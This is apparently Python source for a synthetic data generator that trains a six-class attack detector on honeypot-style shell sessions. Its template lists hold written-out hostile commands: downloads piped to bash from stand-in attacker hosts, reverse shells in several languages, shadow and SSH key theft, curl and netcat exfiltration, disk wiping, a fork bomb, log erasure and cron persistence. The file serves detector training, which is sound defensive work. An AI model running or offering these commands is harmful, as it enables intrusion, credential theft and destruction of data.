"""
Comprehensive Synthetic Data Generator v2 for AdaptiveShield.

Generates diverse, MITRE-informed synthetic sessions for ALL 6 classes:
- Class 0 (Safe): Benign system administration
- Class 1 (Recon): Network/system reconnaissance
- Class 2 (Downloader): Malware download and execution
- Class 3 (Exploit): Credential theft, RATs, shell access
- Class 4 (Destructive): Data wiping, ransomware, system damage
- Class 5 (ADVANCED_APT): Multi-stage attacks with persistence and C2

Key improvements over v1:
1. Templates for ALL 6 classes (not just Recon/Exploit)
2. 50+ unique templates per class for diversity
3. Variability in command structure (different separators, orderings)
4. Realistic MITRE feature computation based on actual patterns
5. Binary feature profiles that match training data distribution
"""

import random
import numpy as np
import pandas as pd
from typing import List, Dict, Optional
from pathlib import Path


# =============================================================================
# CLASS 0: SAFE - Benign system administration
# =============================================================================

SAFE_TEMPLATES = [
    # Basic navigation
    "ls", "ls -la", "ls -lah", "pwd", "cd ~", "cd /tmp", "cd /home",
    "ls -la /", "ls /var", "ls /etc", "ls /usr", "ls /opt",
    
    # System info (benign)
    "uname -a", "uname -r", "uname -s", "hostname", "date", "uptime",
    "whoami", "id", "groups", "echo $HOME", "echo $PATH", "echo $SHELL",
    "printenv", "env | head", "locale",
    
    # File operations (benign)
    "cat README.md", "cat /etc/motd", "head -10 /var/log/syslog",
    "tail -f /var/log/auth.log", "less /etc/passwd",
    "wc -l {file}", "file {file}", "stat {file}",
    "touch testfile.txt", "mkdir testdir", "rmdir testdir",
    "cp file1 file2", "mv file1 file2",
    
    # Process/service checks (benign)
    "ps", "ps aux | head -5", "pgrep sshd", "pgrep nginx",
    "systemctl status sshd", "service nginx status",
    "top -bn1 | head -5", "free -h", "df -h",
    
    # Network checks (benign)
    "ping -c 1 8.8.8.8", "ping -c 1 localhost",
    "curl -I https://google.com", "wget --version",
    "ssh -V", "openssl version",
    
    # Package management (benign)
    "apt list --installed | head", "dpkg -l | head", "yum list installed | head",
    "pip list | head", "npm list --depth=0",
    
    # Text processing (benign)
    "echo 'hello world'", "echo test > /dev/null",
    "grep -r 'config' /etc/*.conf 2>/dev/null | head",
    "awk '{print $1}' /etc/passwd | head",
    "sed -n '1,5p' /etc/passwd",
    
    # Compression (benign)
    "tar -tvf archive.tar", "unzip -l archive.zip", "gzip -l file.gz",
    
    # Help/manual
    "man ls", "help", "bash --version", "python --version", "python3 --version",
]

SAFE_VARS = {
    'file': ['/etc/motd', '/etc/hosts', '~/.bashrc', '/tmp/test.txt', 'README.md'],
}


# =============================================================================
# CLASS 1: RECON - Reconnaissance and scanning
# =============================================================================

RECON_TEMPLATES = [
    # Network scanning
    "nmap -sS -p {ports} {target}",
    "nmap -sV -O {target}",
    "nmap -sn {network}",
    "nmap -A {target}",
    "nmap --script vuln {target}",
    "nmap -sU -p 53,161,500 {target}",
    "masscan -p{ports} {network} --rate={rate}",
    "zmap -p {port} {network}",
    "unicornscan {target}:{ports}",
    
    # Port scanning with netcat
    "nc -zv {target} {port}",
    "nc -zv {target} 1-1000",
    "for p in 22 80 443; do nc -zv {target} $p; done",
    
    # Host discovery
    "ping -c 4 {target}",
    "fping -a -g {network}",
    "arping {target}",
    "traceroute {target}",
    "tracepath {target}",
    
    # DNS reconnaissance
    "dig {domain}",
    "dig +short {domain}",
    "dig ANY {domain}",
    "dig axfr {domain} @{dns}",
    "nslookup {domain}",
    "host {domain}",
    "host -t mx {domain}",
    "whois {domain}",
    "fierce -dns {domain}",
    "dnsenum {domain}",
    
    # System enumeration
    "uname -a",
    "cat /etc/os-release",
    "cat /etc/issue",
    "cat /proc/version",
    "cat /proc/cpuinfo | head -20",
    "cat /proc/meminfo | head -10",
    "lsb_release -a",
    "hostnamectl",
    
    # Network enumeration
    "ifconfig -a",
    "ip addr show",
    "ip route show",
    "ip neigh",
    "netstat -tulpn",
    "netstat -antp",
    "ss -tulpn",
    "ss -antp",
    "route -n",
    "arp -a",
    "cat /etc/hosts",
    "cat /etc/resolv.conf",
    "cat /proc/net/tcp",
    "cat /proc/net/arp",
    
    # Process enumeration
    "ps aux",
    "ps -ef",
    "ps aux | grep -E 'root|admin'",
    "pstree",
    "top -bn1 | head -20",
    
    # User enumeration
    "cat /etc/passwd",
    "cat /etc/group",
    "getent passwd",
    "getent group",
    "id",
    "who",
    "w",
    "last",
    "lastlog",
    "finger",
    "awk -F: '$3 >= 1000 {print $1}' /etc/passwd",
    "cut -d: -f1 /etc/passwd",
    
    # Service enumeration
    "systemctl list-units --type=service",
    "service --status-all",
    "chkconfig --list",
    "cat /etc/services | grep -E '22|80|443'",
    
    # SUID/SGID enumeration
    "find / -perm -4000 2>/dev/null",
    "find / -perm -2000 2>/dev/null",
    "find / -perm -u=s -type f 2>/dev/null",
    
    # Directory enumeration
    "ls -la /home",
    "ls -la /root",
    "ls -la /tmp",
    "ls -la /var/tmp",
    "ls -la /opt",
    "ls -la /var/www",
    
    # Configuration file enumeration
    "find / -name '*.conf' 2>/dev/null | head -20",
    "find / -name '*.cfg' 2>/dev/null | head -20",
    "find /etc -type f -name '*.conf' 2>/dev/null",
    "cat /etc/crontab",
    "ls -la /etc/cron.*",
    
    # Sensitive file search
    "find / -name '*.key' 2>/dev/null",
    "find / -name '*.pem' 2>/dev/null",
    "find / -name 'id_rsa*' 2>/dev/null",
    "find / -name '.bash_history' 2>/dev/null",
    "locate password",
]

RECON_VARS = {
    'ports': ['22', '80', '443', '8080', '3306', '22,80,443', '1-1000', '1-65535', '21,22,23,25,80,443'],
    'port': ['22', '80', '443', '8080', '3306', '5432', '6379', '27017'],
    'target': ['192.168.1.1', '10.0.0.1', '172.16.0.1', '192.168.1.100', '10.10.10.10'],
    'network': ['192.168.1.0/24', '10.0.0.0/8', '172.16.0.0/16', '192.168.0.0/16'],
    'domain': ['target.com', 'example.local', 'internal.corp', 'victim.org'],
    'dns': ['8.8.8.8', 'ns1.target.com', '192.168.1.1'],
    'rate': ['100', '1000', '10000'],
}


# =============================================================================
# CLASS 2: DOWNLOADER - Malware download and execution
# =============================================================================

DOWNLOADER_TEMPLATES = [
    # wget downloads
    "wget http://{c2}/{payload}",
    "wget http://{c2}/{payload} -O /tmp/{name}",
    "wget http://{c2}/{payload} -O /tmp/.{name}",
    "wget -q http://{c2}/{payload} -O /tmp/{name}",
    "wget --no-check-certificate https://{c2}/{payload}",
    "wget http://{c2}/{payload}; chmod +x {payload}; ./{payload}",
    "wget http://{c2}/{payload} -O /tmp/{name} && chmod 777 /tmp/{name} && /tmp/{name}",
    
    # curl downloads
    "curl http://{c2}/{payload} -o /tmp/{name}",
    "curl -O http://{c2}/{payload}",
    "curl -sL http://{c2}/{payload} | bash",
    "curl -s http://{c2}/{payload} | sh",
    "curl -k https://{c2}/{payload} -o /tmp/{name}",
    "curl http://{c2}/{payload} > /tmp/{name}; chmod +x /tmp/{name}; /tmp/{name}",
    
    # Combined wget/curl for reliability
    "cd /tmp; wget http://{c2}/{payload} || curl -O http://{c2}/{payload}; chmod +x {payload}; ./{payload}",
    "which wget && wget http://{c2}/{payload} || curl http://{c2}/{payload} -o {payload}",
    
    # Multi-path attempts (evade restrictions)
    "cd /tmp; cd /var/run; cd /mnt; cd /; wget http://{c2}/{payload}",
    "for d in /tmp /var/tmp /dev/shm; do cd $d && wget http://{c2}/{payload} && break; done",
    
    # Script piping (dangerous!)
    "curl -s http://{c2}/{payload} | bash",
    "wget -qO- http://{c2}/{payload} | sh",
    "curl http://{c2}/{payload} | bash -s",
    "curl -sL https://raw.githubusercontent.com/{user}/{repo}/master/{payload} | bash",
    
    # Crypto miner downloads (common in honeypots)
    "wget http://{c2}/xmrig -O /tmp/xmrig; chmod +x /tmp/xmrig; /tmp/xmrig -o {pool}",
    "curl -sL https://github.com/xmrig/xmrig/releases/download/v{version}/xmrig-{version}-linux-x64.tar.gz | tar xz",
    "wget http://{c2}/setup_miner.sh; chmod +x setup_miner.sh; ./setup_miner.sh",
    
    # Botnet dropper patterns
    "cd /tmp && wget http://{c2}/bot.{arch}; chmod +x bot.{arch}; ./bot.{arch}",
    "wget http://{c2}/mirai.{arch} -O /tmp/.{name}; chmod 777 /tmp/.{name}; /tmp/.{name}",
    "cd /tmp; wget http://{c2}/bins.sh; chmod 777 bins.sh; sh bins.sh",
    
    # tftp/ftp downloads
    "tftp -g -r {payload} {c2}",
    "ftp -n {c2} << EOF\nget {payload}\nEOF",
    
    # Python/Perl downloaders
    "python -c \"import urllib; urllib.urlretrieve('http://{c2}/{payload}', '/tmp/{name}')\"",
    "python3 -c \"import urllib.request; urllib.request.urlretrieve('http://{c2}/{payload}', '/tmp/{name}')\"",
    "perl -e 'use LWP::Simple; getstore(\"http://{c2}/{payload}\", \"/tmp/{name}\")'",
    
    # Base64 encoded URL
    "curl $(echo '{b64url}' | base64 -d) -o /tmp/{name}",
]

DOWNLOADER_VARS = {
    'c2': ['192.168.1.100', '10.10.10.10', '45.33.32.156', '185.220.101.1', 'evil.com', 'malware.site'],
    'payload': ['bot.sh', 'xmrig', 'miner.sh', 'setup.sh', 'update', 'sshd', 'payload.bin', 'x86', 'arm'],
    'name': ['update', 'sshd', '.cache', '.X11', 'systemd', 'cron', 'kworker'],
    'arch': ['x86', 'x86_64', 'arm', 'arm7', 'mips', 'mipsel'],
    'pool': ['pool.minexmr.com:4444', 'xmr.pool.minergate.com:45700', 'stratum+tcp://pool.supportxmr.com:3333'],
    'version': ['6.18.0', '6.17.0', '6.16.0'],
    'user': ['attacker', 'malware', 'MoneroOcean'],
    'repo': ['xmrig_setup', 'miner', 'botnet'],
    'b64url': ['aHR0cDovL2V2aWwuY29tL2JvdC5zaA=='],  # http://evil.com/bot.sh
}


# =============================================================================
# CLASS 3: EXPLOIT - Credential theft, RATs, shell access
# =============================================================================

EXPLOIT_TEMPLATES = [
    # Credential file access
    "cat /etc/shadow",
    "cat /etc/passwd && cat /etc/shadow",
    "cat /etc/master.passwd",
    "cat /etc/security/passwd",
    "cat /etc/security/opasswd",
    "unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt",
    
    # SSH key theft
    "cat ~/.ssh/id_rsa",
    "cat ~/.ssh/id_dsa",
    "cat ~/.ssh/id_ecdsa",
    "cat /root/.ssh/id_rsa",
    "find /home -name 'id_rsa' -exec cat {} \\;",
    "cat ~/.ssh/authorized_keys",
    "cat ~/.ssh/known_hosts",
    
    # History/config theft
    "cat ~/.bash_history",
    "cat ~/.zsh_history",
    "cat ~/.mysql_history",
    "cat ~/.psql_history",
    "cat ~/.python_history",
    "history",
    "cat /var/log/auth.log | grep -i pass",
    
    # Browser credential theft
    "cat ~/.config/google-chrome/Default/Login\\ Data",
    "cat ~/.mozilla/firefox/*.default/logins.json",
    "sqlite3 ~/.config/google-chrome/Default/Login\\ Data 'SELECT * FROM logins'",
    
    # Database credential theft
    "cat /var/www/html/wp-config.php",
    "cat /var/www/html/config.php",
    "grep -r 'password' /var/www 2>/dev/null",
    "grep -r 'DB_PASSWORD' /var/www 2>/dev/null",
    "cat /etc/mysql/my.cnf | grep password",
    
    # Memory credential dumping
    "strings /dev/mem | grep -i password",
    "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -i pass",
    "gdb -p $(pgrep sshd) -ex 'dump memory /tmp/dump.bin 0x0 0xffffffff' -ex quit",
    
    # Hash cracking prep
    "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
    "hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt",
    
    # Reverse shells
    "bash -i >& /dev/tcp/{c2}/{port} 0>&1",
    "bash -c 'bash -i >& /dev/tcp/{c2}/{port} 0>&1'",
    "nc -e /bin/sh {c2} {port}",
    "nc {c2} {port} -e /bin/bash",
    "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {c2} {port} > /tmp/f",
    "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{c2}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{c2}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "perl -e 'use Socket;$i=\"{c2}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")'",
    "php -r '$sock=fsockopen(\"{c2}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "ruby -rsocket -e'f=TCPSocket.open(\"{c2}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    
    # Encoded/obfuscated execution
    "echo '{b64payload}' | base64 -d | bash",
    "base64 -d <<< '{b64payload}' | sh",
    "python -c \"exec(__import__('base64').b64decode('{b64payload}'))\"",
    "eval $(echo '{hexcmd}' | xxd -r -p)",
    
    # Process injection
    "LD_PRELOAD=/tmp/.lib.so /bin/ls",
    "export LD_PRELOAD=/tmp/evil.so",
    
    # Privilege escalation attempts
    "sudo -l",
    "sudo su",
    "sudo bash",
    "pkexec /bin/bash",
    "find / -perm -4000 -type f 2>/dev/null -exec ls -la {} \\;",
    "/usr/bin/find /tmp -exec /bin/sh \\;",
    "python -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
]

EXPLOIT_VARS = {
    'c2': ['192.168.1.100', '10.10.10.10', 'evil.com', 'attacker.net'],
    'port': ['4444', '1234', '9001', '443', '80', '8080'],
    'b64payload': ['YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE='],  # reverse shell
    'hexcmd': ['6563686f2027707775656427'],  # echo 'pwned'
}


# =============================================================================
# CLASS 4: DESTRUCTIVE - Data wiping, ransomware, system damage
# =============================================================================

DESTRUCTIVE_TEMPLATES = [
    # File deletion
    "rm -rf /",
    "rm -rf /*",
    "rm -rf /home/*",
    "rm -rf /var/*",
    "rm -rf /etc/*",
    "rm -rf /tmp/*",
    "rm -rf ~/.ssh",
    "rm -rf /root/.ssh",
    "shred -u /etc/passwd",
    "shred -u /etc/shadow",
    "shred -vfz -n 5 /dev/sda",
    
    # Disk wiping
    "dd if=/dev/zero of=/dev/sda bs=1M",
    "dd if=/dev/urandom of=/dev/sda bs=4M",
    "dd if=/dev/zero of=/dev/sda1",
    "cat /dev/zero > /dev/sda",
    "mkfs.ext4 /dev/sda1",
    
    # Boot sector destruction
    "dd if=/dev/zero of=/dev/sda bs=512 count=1",
    "dd if=/dev/null of=/dev/sda bs=446 count=1",
    
    # Fork bomb / resource exhaustion
    ":(){ :|:& };:",
    "while true; do cat /dev/zero > /dev/null & done",
    "perl -e 'fork while fork'",
    
    # Log destruction / anti-forensics
    "rm -rf /var/log/*",
    "cat /dev/null > /var/log/auth.log",
    "cat /dev/null > /var/log/syslog",
    "cat /dev/null > /var/log/messages",
    "cat /dev/null > /var/log/secure",
    "echo '' > /var/log/wtmp",
    "echo '' > /var/log/lastlog",
    "shred -u /var/log/*.log",
    "find /var/log -type f -exec rm -f {} \\;",
    
    # History destruction
    "history -c",
    "history -w",
    "cat /dev/null > ~/.bash_history",
    "rm -f ~/.bash_history",
    "unset HISTFILE",
    "export HISTSIZE=0",
    "ln -sf /dev/null ~/.bash_history",
    
    # SSH key backdoor (destructive because it locks out legitimate users)
    "cd ~; rm -rf .ssh; mkdir .ssh; echo 'ssh-rsa {attacker_key}' >> .ssh/authorized_keys",
    "chattr -ia ~/.ssh; rm -rf ~/.ssh; mkdir ~/.ssh; echo '{attacker_key}' > ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys; chattr +ia ~/.ssh",
    "cd ~; chattr -ia .ssh; lockr -ia .ssh; rm -rf .ssh; mkdir .ssh; echo 'ssh-rsa AAAAB3NzaC1...' >> .ssh/authorized_keys; chattr +ia .ssh",
    
    # Service disruption
    "systemctl stop sshd",
    "systemctl disable sshd",
    "killall -9 sshd",
    "killall -9 nginx",
    "killall -9 apache2",
    "pkill -9 mysql",
    "iptables -P INPUT DROP",
    "iptables -P OUTPUT DROP",
    "iptables -F",
    
    # System file corruption
    "echo 'corrupted' > /etc/passwd",
    "chmod 000 /etc/shadow",
    "chown nobody:nobody /etc/passwd",
    
    # Ransomware-like behavior
    "find /home -type f -name '*.txt' -exec gpg -c --passphrase '{ransom_key}' {} \\;",
    "find /var/www -type f \\( -name '*.php' -o -name '*.html' \\) -exec openssl enc -aes-256-cbc -in {} -out {}.enc -k {ransom_key} \\;",
    "tar -czf /tmp/all_files.tar.gz /home /var/www && rm -rf /home/* /var/www/*",
]

DESTRUCTIVE_VARS = {
    'attacker_key': ['AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dnnxRN...'],
    'ransom_key': ['PAYBITCOIN123', 'ENCRYPTED', 'LOCKED'],
}


# =============================================================================
# CLASS 5: ADVANCED_APT - Multi-stage with persistence, C2, and exfil
# =============================================================================

APT_TEMPLATES = [
    # Stage 1: Initial access + recon
    ("uname -a; id; whoami; cat /etc/passwd | head -5",),
    ("hostname; ifconfig; netstat -tulpn | head -10",),
    
    # Stage 2: Download implant
    ("wget http://{c2}/implant -O /tmp/.{name}; chmod +x /tmp/.{name}",),
    ("curl -s http://{c2}/payload | base64 -d > /tmp/.{name}; chmod 755 /tmp/.{name}",),
    
    # Stage 3: Establish persistence
    ("echo '* * * * * /tmp/.{name}' >> /var/spool/cron/crontabs/root",),
    ("echo '@reboot /tmp/.{name}' >> /etc/crontab",),
    ("cp /tmp/.{name} /usr/local/bin/.{name}; echo '/usr/local/bin/.{name} &' >> /etc/rc.local",),
    ("echo '[Unit]\nDescription=System Update\n[Service]\nExecStart=/tmp/.{name}\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/.{name}.service; systemctl enable .{name}.service",),
    
    # Stage 4: Credential harvesting
    ("cat /etc/shadow > /tmp/.creds; cat ~/.ssh/id_rsa >> /tmp/.creds; cat ~/.bash_history >> /tmp/.creds",),
    ("grep -r 'password' /var/www 2>/dev/null > /tmp/.creds; cat /etc/passwd >> /tmp/.creds",),
    
    # Stage 5: Exfiltration
    ("curl -X POST http://{c2}/exfil -d @/tmp/.creds",),
    ("cat /tmp/.creds | nc {c2} {port}",),
    ("tar -czf - /home /etc/passwd /etc/shadow | base64 | curl -X POST http://{c2}/upload -d @-",),
    
    # Stage 6: Cleanup / anti-forensics
    ("rm -f /tmp/.creds; history -c; unset HISTFILE",),
    ("shred -u /var/log/auth.log; cat /dev/null > ~/.bash_history",),
    
    # Stage 7: Lateral movement prep
    ("ssh-keyscan 192.168.1.0/24 2>/dev/null > /tmp/.hosts",),
    ("for h in $(cat /tmp/.hosts); do scp /tmp/.{name} root@$h:/tmp/; done",),
    
    # Full multi-stage sequences (combined)
    (
        "uname -a; id; netstat -tulpn",
        "wget http://{c2}/implant -O /tmp/.{name}; chmod +x /tmp/.{name}; /tmp/.{name} &",
        "echo '* * * * * /tmp/.{name}' >> /var/spool/cron/crontabs/root",
        "cat /etc/shadow > /tmp/.c; cat ~/.ssh/id_rsa >> /tmp/.c",
        "curl -X POST http://{c2}/exfil -d @/tmp/.c",
        "rm /tmp/.c; history -c; chattr +i /tmp/.{name}",
    ),
    (
        "hostname; whoami; cat /etc/passwd | wc -l",
        "curl -s http://{c2}/backdoor -o /tmp/.bd; chmod +x /tmp/.bd",
        "nohup /tmp/.bd {c2} {port} &",
        "cp /tmp/.bd /usr/bin/.sysupdate; echo '/usr/bin/.sysupdate &' >> ~/.bashrc",
        "cat /etc/shadow | base64 | curl -X POST http://{c2}/data -d @-",
        "find /var/log -name '*.log' -exec cat /dev/null > {} \\;",
    ),
    (
        "ps aux; netstat -antp; cat /proc/cpuinfo | head -5",
        "cd /tmp; wget http://{c2}/kit.tar.gz; tar xzf kit.tar.gz; cd kit; ./install.sh",
        "cat /etc/crontab; echo '0 */6 * * * /opt/.kit/beacon' >> /etc/crontab",
        "sqlite3 ~/.config/google-chrome/Default/Login\\ Data 'SELECT * FROM logins' > /tmp/.browser",
        "nc {c2} {port} < /tmp/.browser",
        "rm -rf /tmp/kit* /tmp/.browser; history -c",
    ),
]

APT_VARS = {
    'c2': ['192.168.1.100', '10.10.10.10', 'c2.attacker.com', 'update.evil.net'],
    'name': ['sshd', 'systemd', 'kworker', 'update', 'cron', 'rsyslogd'],
    'port': ['443', '8443', '4444', '1337'],
}


# =============================================================================
# MITRE Feature Computation
# =============================================================================

def compute_mitre_features_safe() -> Dict[str, float]:
    """Safe sessions: low/no threat indicators."""
    return {
        'mitre_tactic_reconnaissance': 0.0,
        'mitre_tactic_resource_development': 0.0,
        'mitre_tactic_initial_access': 0.0,
        'mitre_tactic_execution': random.uniform(0.0, 0.5),
        'mitre_tactic_persistence': 0.0,
        'mitre_tactic_privilege_escalation': 0.0,
        'mitre_tactic_defense_evasion': 0.0,
        'mitre_tactic_credential_access': 0.0,
        'mitre_tactic_discovery': random.uniform(0.0, 1.0),  # Some discovery is benign
        'mitre_tactic_lateral_movement': 0.0,
        'mitre_tactic_collection': 0.0,
        'mitre_tactic_command_and_control': 0.0,
        'mitre_tactic_exfiltration': 0.0,
        'mitre_tactic_impact': 0.0,
        'mitre_severity_max': random.uniform(0.0, 3.0),
        'mitre_severity_mean': random.uniform(0.0, 2.0),
        'mitre_severity_weighted': random.uniform(0.0, 2.0),
        'mitre_kill_chain_score': random.uniform(0.0, 1.0),
        'mitre_unique_technique_count': random.randint(0, 2),
        'mitre_total_commands': random.randint(1, 10),
        'mitre_matched_commands': random.randint(0, 2),
    }


def compute_mitre_features_recon() -> Dict[str, float]:
    """Recon: high discovery and reconnaissance."""
    return {
        'mitre_tactic_reconnaissance': random.uniform(2.0, 6.0),
        'mitre_tactic_resource_development': 0.0,
        'mitre_tactic_initial_access': 0.0,
        'mitre_tactic_execution': random.uniform(0.0, 1.0),
        'mitre_tactic_persistence': 0.0,
        'mitre_tactic_privilege_escalation': random.uniform(0.0, 1.0),
        'mitre_tactic_defense_evasion': random.uniform(0.0, 0.5),
        'mitre_tactic_credential_access': random.uniform(0.0, 1.0),
        'mitre_tactic_discovery': random.uniform(3.0, 10.0),
        'mitre_tactic_lateral_movement': random.uniform(0.0, 1.0),
        'mitre_tactic_collection': random.uniform(0.0, 2.0),
        'mitre_tactic_command_and_control': 0.0,
        'mitre_tactic_exfiltration': 0.0,
        'mitre_tactic_impact': 0.0,
        'mitre_severity_max': random.uniform(3.0, 6.0),
        'mitre_severity_mean': random.uniform(2.0, 5.0),
        'mitre_severity_weighted': random.uniform(2.0, 5.0),
        'mitre_kill_chain_score': random.uniform(1.0, 3.0),
        'mitre_unique_technique_count': random.randint(3, 10),
        'mitre_total_commands': random.randint(5, 20),
        'mitre_matched_commands': random.randint(4, 15),
    }


def compute_mitre_features_downloader() -> Dict[str, float]:
    """Downloader: execution and C2."""
    return {
        'mitre_tactic_reconnaissance': random.uniform(0.0, 1.0),
        'mitre_tactic_resource_development': random.uniform(0.0, 1.0),
        'mitre_tactic_initial_access': random.uniform(0.0, 1.0),
        'mitre_tactic_execution': random.uniform(2.0, 5.0),
        'mitre_tactic_persistence': random.uniform(0.0, 2.0),
        'mitre_tactic_privilege_escalation': random.uniform(0.0, 1.0),
        'mitre_tactic_defense_evasion': random.uniform(0.0, 2.0),
        'mitre_tactic_credential_access': 0.0,
        'mitre_tactic_discovery': random.uniform(0.0, 1.0),
        'mitre_tactic_lateral_movement': 0.0,
        'mitre_tactic_collection': 0.0,
        'mitre_tactic_command_and_control': random.uniform(2.0, 5.0),
        'mitre_tactic_exfiltration': 0.0,
        'mitre_tactic_impact': 0.0,
        'mitre_severity_max': random.uniform(5.0, 8.0),
        'mitre_severity_mean': random.uniform(4.0, 6.0),
        'mitre_severity_weighted': random.uniform(4.0, 7.0),
        'mitre_kill_chain_score': random.uniform(2.0, 4.0),
        'mitre_unique_technique_count': random.randint(2, 6),
        'mitre_total_commands': random.randint(3, 10),
        'mitre_matched_commands': random.randint(2, 8),
    }


def compute_mitre_features_exploit() -> Dict[str, float]:
    """Exploit: credential access, priv esc, defense evasion."""
    return {
        'mitre_tactic_reconnaissance': random.uniform(0.0, 1.0),
        'mitre_tactic_resource_development': 0.0,
        'mitre_tactic_initial_access': random.uniform(0.0, 1.0),
        'mitre_tactic_execution': random.uniform(2.0, 5.0),
        'mitre_tactic_persistence': random.uniform(0.0, 2.0),
        'mitre_tactic_privilege_escalation': random.uniform(2.0, 5.0),
        'mitre_tactic_defense_evasion': random.uniform(2.0, 5.0),
        'mitre_tactic_credential_access': random.uniform(3.0, 8.0),
        'mitre_tactic_discovery': random.uniform(1.0, 3.0),
        'mitre_tactic_lateral_movement': random.uniform(0.0, 2.0),
        'mitre_tactic_collection': random.uniform(1.0, 3.0),
        'mitre_tactic_command_and_control': random.uniform(1.0, 4.0),
        'mitre_tactic_exfiltration': random.uniform(0.0, 2.0),
        'mitre_tactic_impact': 0.0,
        'mitre_severity_max': random.uniform(7.0, 10.0),
        'mitre_severity_mean': random.uniform(5.0, 8.0),
        'mitre_severity_weighted': random.uniform(6.0, 9.0),
        'mitre_kill_chain_score': random.uniform(4.0, 8.0),
        'mitre_unique_technique_count': random.randint(5, 12),
        'mitre_total_commands': random.randint(5, 15),
        'mitre_matched_commands': random.randint(4, 12),
    }


def compute_mitre_features_destructive() -> Dict[str, float]:
    """Destructive: high impact, defense evasion."""
    return {
        'mitre_tactic_reconnaissance': 0.0,
        'mitre_tactic_resource_development': 0.0,
        'mitre_tactic_initial_access': 0.0,
        'mitre_tactic_execution': random.uniform(1.0, 3.0),
        'mitre_tactic_persistence': random.uniform(0.0, 2.0),
        'mitre_tactic_privilege_escalation': random.uniform(0.0, 2.0),
        'mitre_tactic_defense_evasion': random.uniform(3.0, 7.0),
        'mitre_tactic_credential_access': random.uniform(0.0, 1.0),
        'mitre_tactic_discovery': 0.0,
        'mitre_tactic_lateral_movement': 0.0,
        'mitre_tactic_collection': 0.0,
        'mitre_tactic_command_and_control': 0.0,
        'mitre_tactic_exfiltration': 0.0,
        'mitre_tactic_impact': random.uniform(5.0, 10.0),
        'mitre_severity_max': random.uniform(8.0, 10.0),
        'mitre_severity_mean': random.uniform(6.0, 9.0),
        'mitre_severity_weighted': random.uniform(7.0, 10.0),
        'mitre_kill_chain_score': random.uniform(2.0, 5.0),
        'mitre_unique_technique_count': random.randint(3, 8),
        'mitre_total_commands': random.randint(3, 12),
        'mitre_matched_commands': random.randint(3, 10),
    }


def compute_mitre_features_apt() -> Dict[str, float]:
    """APT: multi-tactic, high kill chain coverage."""
    return {
        'mitre_tactic_reconnaissance': random.uniform(1.0, 3.0),
        'mitre_tactic_resource_development': random.uniform(0.0, 1.0),
        'mitre_tactic_initial_access': random.uniform(0.0, 1.0),
        'mitre_tactic_execution': random.uniform(2.0, 5.0),
        'mitre_tactic_persistence': random.uniform(2.0, 5.0),
        'mitre_tactic_privilege_escalation': random.uniform(1.0, 4.0),
        'mitre_tactic_defense_evasion': random.uniform(2.0, 5.0),
        'mitre_tactic_credential_access': random.uniform(2.0, 5.0),
        'mitre_tactic_discovery': random.uniform(2.0, 5.0),
        'mitre_tactic_lateral_movement': random.uniform(1.0, 3.0),
        'mitre_tactic_collection': random.uniform(2.0, 4.0),
        'mitre_tactic_command_and_control': random.uniform(2.0, 5.0),
        'mitre_tactic_exfiltration': random.uniform(2.0, 4.0),
        'mitre_tactic_impact': random.uniform(0.0, 2.0),
        'mitre_severity_max': random.uniform(8.0, 10.0),
        'mitre_severity_mean': random.uniform(6.0, 8.0),
        'mitre_severity_weighted': random.uniform(7.0, 9.0),
        'mitre_kill_chain_score': random.uniform(7.0, 12.0),  # High coverage!
        'mitre_unique_technique_count': random.randint(8, 20),
        'mitre_total_commands': random.randint(10, 30),
        'mitre_matched_commands': random.randint(8, 25),
    }


# =============================================================================
# Binary Feature Generation
# =============================================================================

def get_zero_binary_features() -> Dict[str, float]:
    """Return zeroed binary features."""
    cols = [
        'triage_file_size', 'triage_entropy', 'triage_priority',
        'triage_is_go', 'triage_is_packed', 'triage_is_stripped',
        'triage_is_dll', 'triage_is_static', 'triage_score_mining',
        'triage_score_botnet', 'triage_score_recon', 'triage_score_destructive',
        'ghidra_function_count', 'ghidra_total_instructions', 'ghidra_total_basic_blocks',
        'ghidra_max_function_size', 'ghidra_avg_callers', 'ghidra_max_callers',
        'ghidra_mining_pool_count', 'ghidra_crypto_wallet_count', 'ghidra_ip_count',
        'ghidra_url_count', 'ghidra_shell_cmd_count', 'ghidra_file_path_count',
        'ghidra_imports_file_io', 'ghidra_imports_process', 'ghidra_imports_network',
        'ghidra_imports_crypto', 'ghidra_imports_evasion', 'ghidra_has_aes_sbox',
        'ghidra_has_sha256_constants', 'ghidra_has_rc4_state', 'ghidra_has_xor_loop',
        'ghidra_go_user_functions', 'ghidra_go_runtime_functions',
        'angr_basic_blocks', 'angr_edges', 'angr_functions_recovered',
        'angr_cyclomatic_complexity', 'angr_function_count', 'angr_user_functions_listed',
        'angr_syscalls_network', 'angr_syscalls_file_io', 'angr_syscalls_process',
        'angr_syscalls_memory', 'angr_ip_count', 'angr_url_count',
        'angr_mining_indicator_count', 'angr_shell_cmd_count', 'angr_has_network',
        'angr_has_file_manipulation', 'angr_has_process_control', 'angr_has_crypto',
        'angr_has_mining', 'angr_has_persistence', 'angr_has_evasion',
        'angr_has_shell_execution', 'angr_complexity_tier', 'angr_is_partial',
        'angr_loaded_as_blob',
